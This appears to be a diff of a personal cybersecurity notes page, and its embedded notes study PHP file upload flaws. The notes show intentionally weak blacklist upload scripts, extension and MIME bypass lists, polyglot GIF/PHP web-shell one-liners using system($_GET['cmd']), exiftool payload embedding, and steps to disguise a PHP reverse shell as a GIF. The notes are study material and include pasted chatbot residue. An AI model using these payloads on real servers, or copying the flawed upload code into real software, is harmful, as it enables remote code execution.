@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>file upload vulneriblity — Cyber Security Notes</title>
+<title>file upload vulneriblity — Cyber Notes</title>
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -12,60 +12,93 @@ body{background:var(--bg);font-family:'Rajdhani',sans-serif;color:var(--text);mi
 body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,217,255,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,217,255,0.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}
 .scanline{position:fixed;top:-100%;left:0;width:100%;height:2px;background:linear-gradient(transparent,rgba(0,217,255,0.1),transparent);animation:scan 6s linear infinite;pointer-events:none;z-index:1}
 @keyframes scan{to{top:110%}}
-.topbar{position:relative;z-index:2;background:#0a0e15;border-bottom:1px solid var(--border);padding:10px 24px;display:flex;align-items:center;gap:14px}
-.back-btn{color:var(--accent);font-family:'Share Tech Mono',monospace;font-size:12px;text-decoration:none;border:1px solid rgba(0,217,255,0.3);padding:4px 14px;letter-spacing:1px;transition:all .2s}
-.back-btn:hover{background:rgba(0,217,255,0.08)}
-.breadcrumb{font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--dim)}
+
+/* TOPBAR */
+.topbar{position:relative;z-index:2;background:#0a0e15;border-bottom:1px solid var(--border);padding:10px 16px;display:flex;align-items:center;gap:12px}
+.back-btn{color:var(--accent);font-family:'Share Tech Mono',monospace;font-size:11px;text-decoration:none;border:1px solid rgba(0,217,255,0.3);padding:5px 12px;letter-spacing:1px;white-space:nowrap}
+.breadcrumb{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--dim);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 .breadcrumb em{color:var(--accent);font-style:normal}
-.page-header{position:relative;z-index:2;padding:28px 24px 18px;border-bottom:1px solid var(--border);background:linear-gradient(135deg,#0a0e15,#0d1117)}
-.folder-icon{font-size:2.2rem;display:block;margin-bottom:8px}
-.folder-title{font-family:'Share Tech Mono',monospace;font-size:clamp(1.2rem,3vw,1.8rem);color:var(--accent);letter-spacing:3px;text-transform:uppercase;margin-bottom:4px}
-.folder-meta{font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--dim);letter-spacing:2px}
+
+/* HEADER */
+.page-header{position:relative;z-index:2;padding:20px 16px 14px;border-bottom:1px solid var(--border);background:linear-gradient(135deg,#0a0e15,#0d1117)}
+.folder-icon{font-size:2rem;display:block;margin-bottom:6px}
+.folder-title{font-family:'Share Tech Mono',monospace;font-size:clamp(1.1rem,5vw,1.8rem);color:var(--accent);letter-spacing:2px;text-transform:uppercase;margin-bottom:3px}
+.folder-meta{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--dim);letter-spacing:2px}
 .folder-meta em{color:var(--accent3);font-style:normal}
-.search-row{margin-top:12px;display:flex;align-items:center;gap:8px;background:var(--surface);border:1px solid var(--border);padding:8px 14px;max-width:380px}
+.search-row{margin-top:10px;display:flex;align-items:center;gap:8px;background:var(--surface);border:1px solid var(--border);padding:8px 12px}
 .search-row::before{content:'⌕';color:var(--accent);font-size:1rem}
 .s-input{background:none;border:none;outline:none;color:var(--accent);font-family:'Share Tech Mono',monospace;font-size:12px;width:100%;caret-color:var(--accent)}
 .s-input::placeholder{color:var(--dim)}
-.layout{position:relative;z-index:2;display:grid;grid-template-columns:250px 1fr;min-height:calc(100vh - 170px)}
-@media(max-width:700px){.layout{grid-template-columns:1fr;grid-template-rows:auto 1fr}}
-.sidebar{border-right:1px solid var(--border);background:#0a0e15;overflow-y:auto;max-height:calc(100vh - 120px);position:sticky;top:0}
+
+/* DESKTOP: side by side */
+.layout{position:relative;z-index:2;display:grid;grid-template-columns:250px 1fr;min-height:calc(100vh - 160px)}
+
+/* MOBILE: stack vertically */
+@media(max-width:768px){
+  .layout{display:flex;flex-direction:column}
+  .sidebar{
+    max-height:none !important;
+    height:auto;
+    position:relative !important;
+    border-right:none;
+    border-bottom:1px solid var(--border);
+  }
+  .sidebar.hidden{display:none}
+  .viewer{display:flex;flex-direction:column}
+  .viewer.hidden{display:none}
+  .mobile-back-btn{display:flex}
+  .viewer-content{padding:16px;word-wrap:break-word;overflow-wrap:break-word}
+  pre{overflow-x:auto;max-width:100%}
+  table{display:block;overflow-x:auto;max-width:100%}
+}
+
+/* SIDEBAR */
+.sidebar{border-right:1px solid var(--border);background:#0a0e15;overflow-y:auto;position:sticky;top:0;max-height:calc(100vh - 110px)}
 .sidebar::-webkit-scrollbar{width:3px}.sidebar::-webkit-scrollbar-thumb{background:#1e2d3d}
-.sidebar-head{padding:8px 14px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--dim);letter-spacing:3px;background:#080c10;border-bottom:1px solid var(--border);display:flex;justify-content:space-between}
+.sidebar-head{padding:8px 14px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--dim);letter-spacing:3px;background:#080c10;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center}
 .sidebar-head span{color:var(--accent3)}
-.file-item{padding:9px 14px;cursor:pointer;border-bottom:1px solid rgba(255,255,255,0.03);display:flex;align-items:flex-start;gap:8px;transition:all .15s;color:var(--dim)}
+.file-item{padding:11px 14px;cursor:pointer;border-bottom:1px solid rgba(255,255,255,0.03);display:flex;align-items:flex-start;gap:8px;transition:all .15s;color:var(--dim)}
 .file-item:hover{background:rgba(0,217,255,0.05);color:var(--text)}
 .file-item.active{background:rgba(0,217,255,0.08);color:var(--accent);border-left:2px solid var(--accent)}
 .fi-icon{font-size:10px;margin-top:3px;flex-shrink:0;color:var(--accent2)}
-.fi-name{font-family:'Share Tech Mono',monospace;font-size:11px;line-height:1.5;text-transform:capitalize}
-.viewer{display:flex;flex-direction:column}
-.viewer-bar{background:#080c10;border-bottom:1px solid var(--border);padding:8px 20px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--dim);display:flex;align-items:center;gap:6px}
-.v-dot{width:9px;height:9px;border-radius:50%;display:inline-block}
+.fi-name{font-family:'Share Tech Mono',monospace;font-size:11px;line-height:1.5;text-transform:capitalize;word-break:break-word}
+
+/* MOBILE BACK BUTTON (inside viewer) */
+.mobile-back-btn{display:none;align-items:center;gap:8px;padding:10px 14px;background:#080c10;border-bottom:1px solid var(--border);cursor:pointer;color:var(--accent);font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:1px}
+.mobile-back-btn:hover{background:rgba(0,217,255,0.05)}
+
+/* VIEWER */
+.viewer{display:flex;flex-direction:column;min-height:300px}
+.viewer-bar{background:#080c10;border-bottom:1px solid var(--border);padding:8px 16px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--dim);display:flex;align-items:center;gap:6px}
+.v-dot{width:8px;height:8px;border-radius:50%;display:inline-block}
 .vd-r{background:#ff5f56}.vd-y{background:#ffbd2e}.vd-g{background:#27c93f}
-.v-path{color:var(--text);margin-left:4px}
-.viewer-content{padding:28px 36px;line-height:1.85;font-size:15px;overflow-y:auto;flex:1}
-@media(max-width:700px){.viewer-content{padding:16px}}
-.placeholder{display:flex;align-items:center;justify-content:center;min-height:300px;color:var(--dim);font-family:'Share Tech Mono',monospace;font-size:12px;letter-spacing:2px}
-.viewer-content h1{font-family:'Share Tech Mono',monospace;font-size:1.3rem;color:var(--accent);border-bottom:1px solid var(--border);padding-bottom:8px;margin:24px 0 12px;letter-spacing:2px}
-.viewer-content h2{font-family:'Share Tech Mono',monospace;font-size:1rem;color:var(--accent3);margin:20px 0 10px;letter-spacing:1px}
-.viewer-content h3{font-size:.95rem;color:var(--yellow);margin:16px 0 8px;font-weight:700}
+.v-path{color:var(--text);margin-left:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:calc(100% - 60px)}
+.viewer-content{padding:24px 28px;line-height:1.85;font-size:15px;overflow-y:auto;flex:1;overflow-x:hidden;word-wrap:break-word}
+@media(max-width:768px){.viewer-content{padding:14px 16px}}
+.placeholder{display:flex;align-items:center;justify-content:center;min-height:200px;color:var(--dim);font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:2px;text-align:center;padding:20px}
+
+/* MARKDOWN STYLES */
+.viewer-content h1{font-family:'Share Tech Mono',monospace;font-size:clamp(1rem,4vw,1.3rem);color:var(--accent);border-bottom:1px solid var(--border);padding-bottom:8px;margin:24px 0 12px;letter-spacing:2px;word-break:break-word}
+.viewer-content h2{font-family:'Share Tech Mono',monospace;font-size:clamp(.9rem,3.5vw,1rem);color:var(--accent3);margin:20px 0 10px;letter-spacing:1px}
+.viewer-content h3{font-size:clamp(.85rem,3vw,.95rem);color:var(--yellow);margin:16px 0 8px;font-weight:700}
 .viewer-content h4{font-size:.9rem;color:var(--orange);margin:12px 0 6px}
-.viewer-content p{margin-bottom:10px;color:var(--text);font-size:15px}
-.viewer-content code{background:rgba(0,217,255,0.07);color:var(--accent3);padding:2px 7px;border:1px solid rgba(0,217,255,0.15);font-family:'Share Tech Mono',monospace;font-size:12px;border-radius:2px}
-.viewer-content pre{background:#020509;border:1px solid var(--border);border-left:3px solid var(--accent);padding:14px 18px;margin:12px 0;overflow-x:auto;border-radius:2px}
-.viewer-content pre code{background:none;border:none;padding:0;color:var(--accent3);font-size:12px;display:block;white-space:pre}
-.viewer-content ul,.viewer-content ol{padding-left:20px;margin-bottom:10px}
-.viewer-content li{margin-bottom:4px;color:var(--text)}
+.viewer-content p{margin-bottom:10px;color:var(--text);font-size:clamp(13px,3.5vw,15px);word-wrap:break-word}
+.viewer-content code{background:rgba(0,217,255,0.07);color:var(--accent3);padding:2px 6px;border:1px solid rgba(0,217,255,0.15);font-family:'Share Tech Mono',monospace;font-size:11px;border-radius:2px;word-break:break-all}
+.viewer-content pre{background:#020509;border:1px solid var(--border);border-left:3px solid var(--accent);padding:12px 14px;margin:12px 0;overflow-x:auto;border-radius:2px;max-width:100%}
+.viewer-content pre code{background:none;border:none;padding:0;color:var(--accent3);font-size:11px;display:block;white-space:pre;word-break:normal}
+.viewer-content ul,.viewer-content ol{padding-left:18px;margin-bottom:10px}
+.viewer-content li{margin-bottom:4px;color:var(--text);font-size:clamp(13px,3.5vw,15px)}
 .viewer-content li::marker{color:var(--accent)}
 .viewer-content strong{color:var(--accent);font-weight:700}
 .viewer-content em{color:var(--yellow);font-style:normal}
-.viewer-content blockquote{border-left:3px solid var(--accent2);padding:8px 16px;margin:12px 0;color:#aaa;background:rgba(255,62,108,0.04)}
+.viewer-content blockquote{border-left:3px solid var(--accent2);padding:8px 14px;margin:12px 0;color:#aaa;background:rgba(255,62,108,0.04)}
 .viewer-content hr{border:none;border-top:1px solid var(--border);margin:18px 0}
-.viewer-content table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13px}
-.viewer-content th{background:rgba(0,217,255,0.08);color:var(--accent);padding:7px 12px;border:1px solid var(--border);text-align:left;font-family:'Share Tech Mono',monospace;font-size:11px}
-.viewer-content td{padding:7px 12px;border:1px solid var(--border);color:var(--text)}
+.viewer-content table{width:100%;border-collapse:collapse;margin:12px 0;font-size:12px;display:block;overflow-x:auto}
+.viewer-content th{background:rgba(0,217,255,0.08);color:var(--accent);padding:6px 10px;border:1px solid var(--border);text-align:left;font-family:'Share Tech Mono',monospace;font-size:10px;white-space:nowrap}
+.viewer-content td{padding:6px 10px;border:1px solid var(--border);color:var(--text);font-size:12px}
 .viewer-content tr:nth-child(even) td{background:rgba(255,255,255,0.02)}
-.viewer-content a{color:var(--accent);text-decoration:none;border-bottom:1px dashed rgba(0,217,255,0.4)}
-footer{position:relative;z-index:2;border-top:1px solid var(--border);padding:14px 24px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--dim)}
+.viewer-content a{color:var(--accent);text-decoration:none;border-bottom:1px dashed rgba(0,217,255,0.4);word-break:break-all}
+footer{position:relative;z-index:2;border-top:1px solid var(--border);padding:12px 16px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--dim)}
 footer span{color:var(--accent2)}
 </style>
 </head>
@@ -78,17 +111,18 @@ footer span{color:var(--accent2)}
 <div class="page-header">
   <span class="folder-icon">📤</span>
   <div class="folder-title">file upload vulneriblity</div>
-  <div class="folder-meta"><em>2</em> NOTES &nbsp;·&nbsp; CYBER SECURITY VAULT</div>
+  <div class="folder-meta"><em>2</em> NOTES · CYBER SECURITY VAULT</div>
   <div class="search-row">
     <input class="s-input" id="searchInput" placeholder="search notes..." oninput="filterFiles()">
   </div>
 </div>
 <div class="layout">
-  <div class="sidebar">
+  <div class="sidebar" id="sidebar">
     <div class="sidebar-head">FILES <span id="visCount">2</span></div>
     <div id="fileList"></div>
   </div>
-  <div class="viewer">
+  <div class="viewer" id="viewer">
+    <div class="mobile-back-btn" id="mobileBackBtn" onclick="showSidebar()">← ALL NOTES</div>
     <div class="viewer-bar">
       <span class="v-dot vd-r"></span><span class="v-dot vd-y"></span><span class="v-dot vd-g"></span>
       <span class="v-path" id="vPath">select a note</span>
@@ -102,6 +136,21 @@ footer span{color:var(--accent2)}
 
 <script>
 var NOTES = [{"name": "file uplaod vulneriblity", "content": "# PHP File Upload Security - Blacklist Bypass Techniques\n\n## Overview\n\n# 🚨 Unrestricted File Upload\n\n## 📌 Overview\n**Unrestricted File Upload** is a web application vulnerability where an application allows users to upload files **without proper validation** of:\n- File type\n- File extension\n- File content\n- File size\n- File name\n\nThis can expose the server and its users to **critical security risks**.\n\n---\n\n## ⚠️ Impact\n\n- 🔴 **System Compromise**  \n  Attackers can upload and execute web shells to gain control of the server or access sensitive files.\n\n- 🎣 **Phishing**  \n  Malicious pages can be uploaded to deceive legitimate users.\n\n- 🦠 **Malware / Ransomware**  \n  Uploaded files may infect the server or end users.\n\n- 💥 **Denial of Service (DoS)**  \n  Large or unlimited file uploads can exhaust server storage and resources.\n\n- 🧨 **Defacement & Data Corruption**  \n  Attackers may overwrite or modify important application files.\n\n---\n\n## 🛠️ Attack Methods\n\n- 📄 **Uploading Executable Files**  \n  Uploading files like:\n  - `.php`\n  - `.asp`\n  - `.exe`  \n  which can execute malicious code on the server.\n\n- 📂 **Path Traversal**  \n  Using file names such as:\n  ```text\n  ../../config.php\n\n\nThis document covers PHP file upload vulnerabilities, specifically focusing on blacklist bypass techniques and secure implementation practices.\n\n---\n\n## File Upload Example 1: Basic Blacklist (file-upload3.php)\n\n### Code Implementation\n\n```php\n<?php\n\n// Debugging: Uncomment to see POST and FILES arrays\n// print_r($_POST);\n// print_r($_FILES);\n\nif (isset($_POST['upload'])) {\n\n    // Blacklist of disallowed file extensions\n    $notallowed = array('php');\n\n    // Split the filename by \".\"\n    $splitfilename = explode(\".\", $_FILES[\"file\"][\"name\"]);\n\n    // Extract the file extension\n    $fileextension = end($splitfilename);\n\n    // Check for upload errors or disallowed extensions\n    if ($_FILES['file']['error'] || in_array($fileextension, $notallowed)) {\n        echo \"Please upload a PNG / JPG / GIF\";\n        die();\n    } else {\n        echo \"Name: \" . $_FILES[\"file\"][\"name\"] . \"<br />\";\n        echo \"Size: \" . $_FILES[\"file\"][\"size\"] . \"<br />\";\n        echo \"Temp File: \" . $_FILES[\"file\"][\"tmp_name\"] . \"<br />\";\n\n        // Move the uploaded file to the \"upload\" directory\n        // move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]);\n\n        if (move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"])) {\n            echo \"File Uploaded Successfully\";\n        } else {\n            echo \"Could not Upload file\";\n        }\n    }\n}\n\n?>\n\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>File Upload - Blacklist</title>\n</head>\n<body>\n\n<form action=\"file-upload3.php\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"file\" name=\"file\">\n    <input type=\"submit\" name=\"upload\" value=\"Upload\">\n</form>\n\n</body>\n</html>\n```\n\n### Vulnerabilities\n\n- Only blocks `.php` extension (case-sensitive)\n- Vulnerable to various bypass techniques\n\n---\n\n## Blacklist Filters Bypass Techniques\n\n### Common Bypass Methods\n\nBlacklist filters that block certain file extensions (like `.php`) can often be bypassed using variations in case sensitivity, additional extensions, or alternative but executable file extensions related to PHP.\n\n#### 1. Case Variations\n\n- `.PHP`\n- `.Php`\n- `.pHp`\n- `.phP`\n\n**Explanation:** Case-insensitive OS or PHP treats them equally\n\n#### 2. Alternative PHP-related Extensions\n\n- `.inc` (include files)\n- `.phar` (PHP Archive)\n- `.php3`\n- `.php4`\n- `.php5`\n- `.php6`\n- `.pht`\n- `.phtml`\n\n**Explanation:** Other PHP executable extensions or archive types\n\n### Summary Table\n\n|Bypass Method|Examples|Explanation|\n|---|---|---|\n|Case variation|`.PHP`, `.Php`, `.pHp`, `.phP`|Case-insensitive OS or PHP treats them equally|\n|Alternative extensions|`.inc`, `.phar`, `.php3`, `.php4`, `.php5`, `.php6`, `.pht`, `.phtml`|Other PHP executable extensions or archive types|\n\n**Important Note:** These variations are all potentially executable by PHP interpreters on the server, so blacklisting only `.php` (case-sensitive or just lowercase) is insufficient to secure file upload systems.\n\n---\n\n## Apache Configuration Analysis\n\n### Configuration File: `/etc/apache2/mods-available/php8.2.conf`\n\n```apache\n# Using (?:pattern) instead of (pattern) is a small optimization that\n# avoid capturing the matching pattern (as $1) which isn't used here\n<FilesMatch \".+\\.ph(?:ar|p|tml)$\">\n    SetHandler application/x-httpd-php\n</FilesMatch>\n\n<FilesMatch \".+\\.phps$\">\n    SetHandler application/x-httpd-php-source\n    # Deny access to raw php sources by default\n    # To re-enable it's recommended to enable access to the files\n    # only in specific virtual host or directory\n    Require all denied\n</FilesMatch>\n\n# Deny access to files without filename (e.g. '.php')\n<FilesMatch \"^\\.ph(?:ar|p|ps|tml)$\">\n    Require all denied\n</FilesMatch>\n\n# Running PHP scripts in user directories is disabled by default\n#\n# To re-enable PHP in user directories comment the following lines\n# (from <IfModule ...> to </IfModule>.) Do NOT set it to On as it\n# prevents .htaccess files from disabling it.\n<IfModule mod_userdir.c>\n    <Directory /home/*/public_html>\n        php_admin_flag engine Off\n    </Directory>\n</IfModule>\n```\n\n### Key Points from Configuration\n\n#### PHP Handler Settings\n\nThe regex pattern: `.+\\.ph(?:ar|p|tml)$`\n\n**Matches files with extensions:**\n\n- `.php`\n- `.phar`\n- `.phtml`\n\n#### Files Handled by PHP Source Handler\n\nFiles ending with `.phps` are not executable, but raw source code is generally denied.\n\n**Directive:**\n\n```apache\nRequire all denied\n```\n\n#### Files Denied Access Outright\n\nFiles with no basename but only extension matching: `^\\.ph(?:ar|p|ps|tml)$`\n\n**Examples:** `.php`, `.phar`\n\n#### PHP Scripts Execution Disabled in User Directories\n\nFor extra safety, execution is disabled under `/home/*/public_html` by setting:\n\n```apache\nphp_admin_flag engine Off\n```\n\n---\n\n## Security Implications for File Upload\n\n### Executable File Extensions\n\nThe server treats `.php`, `.phar`, `.phtml` files as executable PHP scripts.\n\n### Non-Executable but Source Denied\n\nFiles with extensions `.phps` are not executable, but raw source code is generally denied.\n\n### Upload Protection Recommendations\n\nAny upload allowing these extensions (`.php`, `.phar`, `.phtml`) can potentially execute PHP code if accessed via the web.\n\n### Risk Assessment\n\nEven `.phar` files pose risks because they can include executable PHP content.\n\n### User Directory Safety\n\nExecution is disabled in user directories for extra safety.\n\n---\n\n## Conclusion\n\nThis configuration shows that a blacklist or filter for `.php` extension alone is inadequate protection against malicious file upload because `.phar` and `.phtml` are equally executed as PHP. Security controls must consider all PHP-executable file extensions.\n\n### File Upload Protections Should:\n\n1. **Reject or strictly validate uploads of:**\n    \n    - `.php`\n    - `.phar`\n    - `.phtml`\n    - And other PHP executable types\n2. **Prefer whitelisting safe extensions** (e.g., `.jpg`, `.png`, `.gif`)\n    \n3. **Store uploads outside web-accessible directories** or disable script execution in upload directories\n    \n4. **Implement additional content inspection** and sandboxing to mitigate risks\n    \n\nThis aligns with blacklist bypass techniques using variations of PHP-related extensions to execute code on the server.\n\n---\n\n## File Upload Example 2: Content-Type Blacklist (file-upload4.php)\n\n### Code Implementation\n\n```php\n<?php\n\n// Debugging: Uncomment for debugging POST and FILES arrays\n// print_r($_POST);\n// print_r($_FILES);\n\nif (isset($_POST['upload'])) {\n\n    // Check if there was an error uploading or if MIME type is PHP\n    if ($_FILES['file']['error'] || $_FILES[\"file\"][\"type\"] === \"application/x-php\") {\n        echo \"Please upload a PNG / JPG / GIF\";\n        die();\n    } else {\n        echo \"Name: \" . $_FILES[\"file\"][\"name\"] . \"<br />\";\n        echo \"Size: \" . $_FILES[\"file\"][\"size\"] . \"<br />\";\n        echo \"Temp File: \" . $_FILES[\"file\"][\"tmp_name\"] . \"<br />\";\n\n        // Move uploaded file to \"upload\" directory\n        // move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]);\n\n        if (move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"])) {\n            echo \"File Uploaded Successfully\";\n        } else {\n            echo \"Could not Upload file\";\n        }\n    }\n}\n\n?>\n\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>File Upload - Blacklist (Content-Type)</title>\n</head>\n<body>\n\n<form action=\"file-upload3.php\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"file\" name=\"file\">\n    <input type=\"submit\" name=\"upload\" value=\"Upload\">\n</form>\n\n</body>\n</html>\n```\n\n### Vulnerabilities\n\n- Only checks MIME type for `application/x-php`\n- MIME type is client-controlled and can be easily spoofed\n- Does not validate file extension\n- Does not validate actual file content\n\n### Bypass Techniques\n\n1. Modify the `Content-Type` header in the HTTP request\n2. Upload a PHP file with a spoofed MIME type (e.g., `image/jpeg`)\n3. Use tools like Burp Suite to intercept and modify the request\n\n---\n\n## File Upload Example 3: MIME Content-Type Detection (file-upload5.php)\n\n### Code Implementation\n\n```php\n<?php\n\n// print_r($_POST); // Uncomment to debug POST data\n// print_r($_FILES); // Uncomment to debug FILES data\n\nif (isset($_POST['upload'])) {\n\n    // Get the temporary filename of the uploaded file\n    $file_tmp_name = $_FILES[\"file\"][\"tmp_name\"];\n\n    // Display detected MIME type of the uploaded file\n    echo mime_content_type($file_tmp_name) . \"<br />\";\n\n    // Check if there was an upload error or file is detected as PHP type\n    if ($_FILES['file']['error'] || mime_content_type($file_tmp_name) === \"text/x-php\") {\n        echo \"Please upload a PNG / JPG / GIF\";\n        die();\n    } else {\n        // Show uploaded file details\n        echo \"Name: \" . $_FILES[\"file\"][\"name\"] . \"<br />\";\n        echo \"Size: \" . $_FILES[\"file\"][\"size\"] . \"<br />\";\n        echo \"Temp File: \" . $_FILES[\"file\"][\"tmp_name\"] . \"<br />\";\n\n        // Uncomment below line to move uploaded file to 'upload' directory\n        // move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]);\n\n        // Attempt to move the uploaded file and confirm result\n        if (move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"])) {\n            echo \"File Uploaded Successfully\";\n        } else {\n            echo \"Could not Upload file\";\n        }\n    }\n}\n\n?>\n\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>File Upload - Blacklist (MIME Content-Type)</title>\n</head>\n<body>\n\n<!-- File upload form -->\n<form action=\"file-upload4.php\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"file\" name=\"file\">\n    <input type=\"submit\" name=\"upload\" value=\"Upload\">\n</form>\n\n</body>\n</html>\n```\n\n### Key Differences from Previous Examples\n\n#### Uses `mime_content_type()` Function\n\nThis function detects the MIME type based on the **actual file content** (magic bytes), not just the client-supplied `Content-Type` header.\n\n#### Detection Method\n\n```php\nmime_content_type($file_tmp_name)\n```\n\n- Reads the file's magic bytes/signature\n- More reliable than `$_FILES[\"file\"][\"type\"]` which is client-controlled\n\n#### Blocked MIME Type\n\n```php\nmime_content_type($file_tmp_name) === \"text/x-php\"\n```\n\n- Blocks files detected as PHP scripts\n\n### Vulnerabilities and Limitations\n\n#### 1. Limited MIME Type Blacklist\n\n- Only blocks `text/x-php`\n- Doesn't block other PHP-related MIME types like:\n    - `application/x-httpd-php`\n    - `application/x-php`\n    - `text/php`\n\n#### 2. Magic Bytes Can Be Spoofed\n\nWhile better than client-supplied MIME types, magic bytes can still be manipulated by:\n\n- Prepending valid image headers to PHP code\n- Creating polyglot files (valid image + PHP code)\n- Using NULL byte injection in older PHP versions\n\n#### 3. Doesn't Validate File Extension\n\nThe script doesn't check the file extension, so:\n\n- `shell.php` could potentially be uploaded if magic bytes are spoofed\n- File could execute if accessed directly via web browser\n\n#### 4. No Deep Content Inspection\n\n- Doesn't verify entire file content\n- Doesn't strip metadata or embedded code\n- Doesn't re-encode images\n\n### Bypass Techniques for file-upload5.php\n\nThe provided commands create a file with a specific \"magic number\" intended to mimic a GIF image, followed by the contents of a PHP reverse shell script. The `file` command then attempts to identify the file type based on its magic bytes. Source↗\n\n**What Happens When Running These Commands**\n\nThe command:\n\n```\necho -n -e 'GIF87a' > php-reverse-shell-magic.php\n```\n\nwrites the ASCII string `\"GIF87a\"` to the beginning of a new file, which is the typical GIF file magic number.\n\nThe command:\n\n```\ncat php-reverse-shell.php >> php-reverse-shell-magic.php\n```\n\nappends the contents of a PHP reverse shell script to that file.\n\nRunning:\n\n```\nfile php-reverse-shell-magic.php\n```\n\nasks the `file` utility to identify the file based on its contents, specifically the initial bytes (magic number).\n\n**Outcome and Explanation**\n\n- The resulting file begins with the bytes corresponding to `GIF87a`, which is the header signature for GIF image files.\n- Most file identification tools, including the `file` command, use magic numbers at the file's start to guess its type. Because this file begins with the GIF header, the `file` command will likely label it as a GIF file, regardless of the actual contents after the header.\n\n---\n\n**Note:** Yet, attackers may still attempt advanced evasion like using polyglot files or double extensions that may fool MIME detection or server configuration.\n\n[Claude is AI and can make mistakes.  \nPlease double-check responses.](https://support.anthropic.com/en/articles/8525154-claude-is-providing-incorrect-or-misleading-responses-what-s-going-on)\n\n  # version 6-\n  \n  <?php\n\n  \n\n// Debug: Uncomment to inspect POST and FILES arrays\n\n// print_r($_POST);\n\n// print_r($_FILES);\n\n  \n\nif (isset($_POST['upload'])) {\n\n// Define allowed file extensions whitelist\n\n$allowed = array('png', 'jpg', 'gif');\n\n// Extract file extension from uploaded file name\n\n$splitfilename = explode(\".\", $_FILES[\"file\"][\"name\"]);\n\necho \"<pre>\";\n\nprint_r($splitfilename); // Debug: Shows parts of file name split by '.'\n\necho \"</pre>\";\n\n$fileExtension = end($splitfilename); // Get last element as extension\n\necho $fileExtension . \"<br />\"; // Debug: Display the file extension\n\n// Check for upload errors\n\nif ($_FILES['file']['error']) {\n\necho \"Please upload a PNG / JPG / GIF\";\n\ndie();\n\n} else {\n\n// Check if file extension is in the allowed list\n\nif (in_array(strtolower($fileExtension), $allowed)) {\n\n// Display file info\n\necho \"Name: \" . $_FILES[\"file\"][\"name\"] . \"<br />\";\n\necho \"Size: \" . $_FILES[\"file\"][\"size\"] . \"<br />\";\n\necho \"Temp File: \" . $_FILES[\"file\"][\"tmp_name\"] . \"<br />\";\n\n// Move uploaded file to 'upload' directory\n\nmove_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]);\n\necho \"File Uploaded Successfully\";\n\n} else {\n\necho \"<br />Please upload a PNG / JPG / GIF\";\n\n}\n\n}\n\n}\n\n  \n\n?>\n\n  \n\n<!DOCTYPE html>\n\n<html>\n\n<head>\n\n<meta charset=\"utf-8\">\n\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n\n<title>File Upload - Whitelist (File Extension)</title>\n\n</head>\n\n<body>\n\n  \n\n<form action=\"file-upload6.php\" method=\"POST\" enctype=\"multipart/form-data\">\n\n<input type=\"file\" name=\"file\">\n\n<input type=\"submit\" name=\"upload\" value=\"Upload\">\n\n</form>\n\n  \n\n</body>\n\n</html>\n\nSonnet 4.5\n\n\nisme hame server misconfigurr karna padega jab usse wo php ki TARAH LEGA \n\n#### 1. Polyglot File Attack\n\nCreate a file that is both a valid image and contains PHP code:\n\n```bash\n# Create a polyglot GIF/PHP file\necho 'GIF89a<?php system($_GET[\"cmd\"]); ?>' > shell.gif.php\n\n# OR prepend valid image bytes\ncat image.gif shell.php > polyglot.gif\n```\n\nThe magic bytes detection might identify it as `image/gif` but it can still execute as PHP if the extension is `.php`.\n\n#### 2. Image with Embedded PHP\n\n```php\n# Create a valid image with PHP in metadata/comments\nexiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg\n```\n\n#### 3. Double Extension\n\nIf the server processes files with multiple extensions:\n\n```\nshell.php.gif  # Might be detected as GIF but executed as PHP\n```\n\n#### 4. Case Sensitivity\n\nTry different MIME type variations that might not be blocked:\n\n- `TEXT/X-PHP`\n- `Text/X-Php`\n\n---\n\n## Advanced Bypass: File Magic Number Spoofing to Mimic GIF\n\n### Technique Overview\n\nThis technique creates a file with GIF magic bytes at the beginning, making MIME type detection identify it as a GIF image, while the rest of the file contains executable PHP code.\n\n### Step-by-Step Process\n\n#### Step 1: Create File with GIF Magic Number\n\nThe 